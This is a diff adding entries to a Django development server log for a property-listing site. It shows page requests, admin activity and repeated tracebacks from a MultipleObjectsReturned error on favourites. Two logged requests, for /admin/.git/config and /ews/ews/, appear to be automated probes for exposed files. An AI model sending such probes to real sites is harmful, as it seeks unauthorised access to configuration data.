@@ -8367,3 +8367,1210 @@ Starting development server at http://127.0.0.1:8000/
 Quit the server with CONTROL-C.
 
 Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 28, 2023 - 16:56:17
+Django version 4.2.6, using settings 'project.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+
+Watching for file changes with StatReloader
+[28/Nov/2023 17:00:28] "GET /maps/search HTTP/1.1" 200 14763
+[28/Nov/2023 17:00:33] "GET /maps/search HTTP/1.1" 200 14763
+[28/Nov/2023 17:00:34] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[28/Nov/2023 17:00:39] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 17:00:40] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+[28/Nov/2023 17:00:40] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 304 0
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 640, in get
+    raise self.model.MultipleObjectsReturned(
+accounts.models.Favourite.MultipleObjectsReturned: get() returned more than one Favourite -- it returned 3!
+[28/Nov/2023 17:00:45] "GET /property/69AqZ/details/ HTTP/1.1" 500 72097
+[28/Nov/2023 17:02:20] "GET / HTTP/1.1" 200 13994
+Not Found: /ews/ews/
+[28/Nov/2023 17:02:37] "GET /ews/ews/ HTTP/1.1" 404 4095
+[28/Nov/2023 17:45:57] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 17:45:57] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+[28/Nov/2023 17:45:57] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[28/Nov/2023 17:45:57] "GET /static/imgs/logo.jpeg HTTP/1.1" 200 32248
+[28/Nov/2023 17:45:57] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 200 5115
+[28/Nov/2023 17:45:57] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 200 838594
+[28/Nov/2023 17:45:57] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[28/Nov/2023 17:45:58] "GET /static/imgs/logo-transparent.png HTTP/1.1" 200 1465
+[28/Nov/2023 17:45:58] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[28/Nov/2023 17:52:42] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 18:00:37] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 18:00:44] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 18:00:44] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[28/Nov/2023 18:00:44] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 640, in get
+    raise self.model.MultipleObjectsReturned(
+accounts.models.Favourite.MultipleObjectsReturned: get() returned more than one Favourite -- it returned 3!
+[28/Nov/2023 18:00:47] "GET /property/69AqZ/details/ HTTP/1.1" 500 72097
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 640, in get
+    raise self.model.MultipleObjectsReturned(
+accounts.models.Favourite.MultipleObjectsReturned: get() returned more than one Favourite -- it returned 3!
+[28/Nov/2023 18:01:07] "GET /property/69AqZ/details/ HTTP/1.1" 500 72097
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 640, in get
+    raise self.model.MultipleObjectsReturned(
+accounts.models.Favourite.MultipleObjectsReturned: get() returned more than one Favourite -- it returned 3!
+[28/Nov/2023 18:01:18] "GET /property/69AqZ/details/ HTTP/1.1" 500 72403
+[28/Nov/2023 18:22:31] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 18:47:47] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 18:47:47] "GET /static/css/normalize.css HTTP/1.1" 200 6138
+[28/Nov/2023 18:47:47] "GET /static/css/pages/main.css HTTP/1.1" 200 9243
+[28/Nov/2023 18:47:47] "GET /static/imgs/logo.jpeg HTTP/1.1" 200 32248
+[28/Nov/2023 18:47:47] "GET /static/imgs/logoText-e961f794.png HTTP/1.1" 200 5115
+[28/Nov/2023 18:47:48] "GET /static/js/pages/app.js HTTP/1.1" 200 199
+[28/Nov/2023 18:47:48] "GET /static/js/pages/index.js HTTP/1.1" 200 591
+[28/Nov/2023 18:47:48] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 200 838594
+[28/Nov/2023 18:47:48] "GET /static/imgs/logo-transparent.png HTTP/1.1" 200 1465
+[28/Nov/2023 19:14:29] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 19:21:24] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 19:25:55] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 19:43:59] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 200 838594
+[28/Nov/2023 19:45:21] "GET /static/imgs/logo.jpeg HTTP/1.1" 200 32248
+Not Found: /assets/imgs/logo.jpeg
+[28/Nov/2023 19:45:22] "GET /assets/imgs/logo.jpeg HTTP/1.1" 404 4129
+[28/Nov/2023 20:00:33] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:00:33] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[28/Nov/2023 20:00:33] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+[28/Nov/2023 20:00:36] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:00:37] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:00:38] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:00:39] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:00:42] "GET /auth HTTP/1.1" 301 0
+[28/Nov/2023 20:00:42] "GET /auth/ HTTP/1.1" 200 8277
+[28/Nov/2023 20:00:42] "GET /static/css/users/authenticate.css HTTP/1.1" 200 1296
+Not Found: /auth/assets/imgs/logo.jpeg
+[28/Nov/2023 20:00:42] "GET /auth/assets/imgs/logo.jpeg HTTP/1.1" 404 4148
+[28/Nov/2023 20:00:45] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:46] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:47] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:49] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:50] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:50] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:51] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:51] "POST /login/ HTTP/1.1" 302 0
+[28/Nov/2023 20:00:52] "GET /accounts/profile HTTP/1.1" 301 0
+[28/Nov/2023 20:00:52] "GET /accounts/profile/ HTTP/1.1" 200 10354
+[28/Nov/2023 20:00:52] "GET /static/css/users/main.css HTTP/1.1" 200 227
+Not Found: /accounts/profile/assets/imgs/logo.jpeg
+[28/Nov/2023 20:00:52] "GET /accounts/profile/assets/imgs/logo.jpeg HTTP/1.1" 404 5721
+[28/Nov/2023 20:00:54] "GET /favourites/ HTTP/1.1" 200 13247
+Not Found: /favourites/assets/imgs/logo.jpeg
+[28/Nov/2023 20:00:54] "GET /favourites/assets/imgs/logo.jpeg HTTP/1.1" 404 4166
+[28/Nov/2023 20:08:58] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:12:22] "GET / HTTP/1.1" 200 14010
+Internal Server Error: /property/69AqZ/details/
+Traceback (most recent call last):
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/core/handlers/base.py", line 197, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/albdah-rebuild/property/views.py", line 23, in property_details
+    ad = Favourite.objects.get(user=request.user, property=property)
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/manager.py", line 87, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/albdah-rebuild/lib/python3.11/site-packages/django/db/models/query.py", line 640, in get
+    raise self.model.MultipleObjectsReturned(
+accounts.models.Favourite.MultipleObjectsReturned: get() returned more than one Favourite -- it returned 3!
+[28/Nov/2023 20:12:23] "GET /property/69AqZ/details/ HTTP/1.1" 500 73276
+Not Found: /favicon.ico
+[28/Nov/2023 20:12:24] "GET /favicon.ico HTTP/1.1" 404 4103
+[28/Nov/2023 20:12:31] "GET /admin HTTP/1.1" 301 0
+[28/Nov/2023 20:12:32] "GET /admin/ HTTP/1.1" 302 0
+[28/Nov/2023 20:12:32] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4013
+[28/Nov/2023 20:12:33] "GET /static/admin/css/login.css HTTP/1.1" 200 958
+[28/Nov/2023 20:12:33] "GET /static/admin/css/dark_mode.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:33] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:33] "GET /static/admin/css/rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:33] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:33] "GET /static/admin/css/responsive_rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:33] "GET /static/override.css HTTP/1.1" 200 156
+[28/Nov/2023 20:12:33] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:33] "GET /static/admin/js/theme.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:34] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:44] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[28/Nov/2023 20:12:44] "GET /admin/ HTTP/1.1" 200 12909
+[28/Nov/2023 20:12:46] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 441
+[28/Nov/2023 20:12:46] "GET /static/admin/css/dark_mode.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/css/rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/css/responsive_rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/js/theme.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[28/Nov/2023 20:12:46] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[28/Nov/2023 20:12:46] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /admin/accounts/favourite/ HTTP/1.1" 200 13086
+[28/Nov/2023 20:12:54] "GET /static/admin/css/dark_mode.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/css/rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/css/responsive_rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 20:12:54] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:54] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[28/Nov/2023 20:12:55] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/theme.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/js/filters.js HTTP/1.1" 304 0
+[28/Nov/2023 20:12:55] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[28/Nov/2023 20:12:59] "POST /admin/accounts/favourite/ HTTP/1.1" 200 11454
+[28/Nov/2023 20:12:59] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:59] "GET /static/admin/css/dark_mode.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:59] "GET /static/admin/css/rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:59] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[28/Nov/2023 20:12:59] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/css/responsive_rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/theme.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:00] "GET /static/admin/js/cancel.js HTTP/1.1" 200 884
+[28/Nov/2023 20:13:01] "POST /admin/accounts/favourite/ HTTP/1.1" 302 0
+[28/Nov/2023 20:13:01] "GET /admin/accounts/favourite/ HTTP/1.1" 200 10898
+[28/Nov/2023 20:13:02] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/css/dark_mode.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/css/rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /admin/jsi18n/ HTTP/1.1" 200 14011
+[28/Nov/2023 20:13:02] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/css/responsive_rtl.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/theme.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/js/filters.js HTTP/1.1" 304 0
+[28/Nov/2023 20:13:02] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[28/Nov/2023 20:13:03] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:13:04] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:13:05] "GET /static/css/property/property-details.css HTTP/1.1" 304 0
+[28/Nov/2023 20:13:05] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:13:10] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:13:10] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:13:14] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:13:14] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:13:17] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:13:17] "GET /accounts/profile/ HTTP/1.1" 200 10322
+[28/Nov/2023 20:13:19] "GET /favourites/ HTTP/1.1" 200 5546
+[28/Nov/2023 20:13:20] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:21:32] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:21:37] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:21:38] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM_1.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_3.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_1.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM_2.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /static/css/property/property-details.css HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.03_PM_2.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.02_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM_2.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.01_PM_1.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:38] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.00_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:21:39] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:21:40] "GET /static/js/pages/index.js HTTP/1.1" 304 0
+[28/Nov/2023 20:21:42] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:22:24] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:22:25] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:22:28] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:22:29] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:22:33] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:22:33] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:22:37] "GET /property/report/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:22:37] "GET /property/report/reported HTTP/1.1" 200 5625
+[28/Nov/2023 20:22:41] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:22:43] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:22:54] "GET /accounts/profile/ HTTP/1.1" 200 10354
+[28/Nov/2023 20:22:54] "GET /static/css/users/main.css HTTP/1.1" 200 227
+[28/Nov/2023 20:22:58] "GET /favourites/ HTTP/1.1" 200 8113
+[28/Nov/2023 20:23:04] "GET /accounts/profile/ HTTP/1.1" 200 10354
+[28/Nov/2023 20:23:15] "GET /favourites/ HTTP/1.1" 200 8113
+[28/Nov/2023 20:23:16] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:23:22] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:23:22] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:23:26] "GET /accounts/profile/ HTTP/1.1" 200 10354
+[28/Nov/2023 20:23:27] "GET /favourites/ HTTP/1.1" 200 5546
+[28/Nov/2023 20:23:29] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:23:31] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:23:34] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:23:34] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:23:39] "GET /accounts/profile/ HTTP/1.1" 200 10354
+[28/Nov/2023 20:23:40] "GET /favourites/ HTTP/1.1" 200 8113
+[28/Nov/2023 20:23:41] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:23:49] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:23:51] "GET /maps/search HTTP/1.1" 200 14763
+[28/Nov/2023 20:24:07] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:24:12] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:25:02] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:25:07] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:25:23] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:25:23] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
+[28/Nov/2023 20:25:25] "GET /property/add-to-favourite/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:25:25] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:25:33] "GET /property/report/69AqZ/ HTTP/1.1" 302 0
+[28/Nov/2023 20:25:34] "GET /property/report/reported HTTP/1.1" 200 5625
+[28/Nov/2023 20:25:38] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:25:39] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:25:53] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:25:55] "GET /maps/search HTTP/1.1" 200 14763
+[28/Nov/2023 20:26:11] "GET / HTTP/1.1" 200 13994
+[28/Nov/2023 20:26:22] "GET /property/69AqZ/details/ HTTP/1.1" 200 25290
+[28/Nov/2023 20:27:31] "GET /admin/.git/config HTTP/1.1" 302 0
+[28/Nov/2023 20:47:39] "GET / HTTP/1.1" 200 14010
+[28/Nov/2023 20:47:39] "GET /static/css/pages/main.css HTTP/1.1" 304 0
+[28/Nov/2023 20:47:39] "GET /media/property/images/WhatsApp_Image_2023-11-26_at_4.36.04_PM.jpeg HTTP/1.1" 304 0
+[28/Nov/2023 20:47:42] "GET /maps/search HTTP/1.1" 200 14763
+[28/Nov/2023 20:47:42] "GET /static/css/maps/style.css HTTP/1.1" 200 2701
+Not Found: /maps/assets/imgs/logo.jpeg
+[28/Nov/2023 20:47:42] "GET /maps/assets/imgs/logo.jpeg HTTP/1.1" 404 4225
+[28/Nov/2023 20:47:49] "GET /property/69AqZ/details/ HTTP/1.1" 200 25272
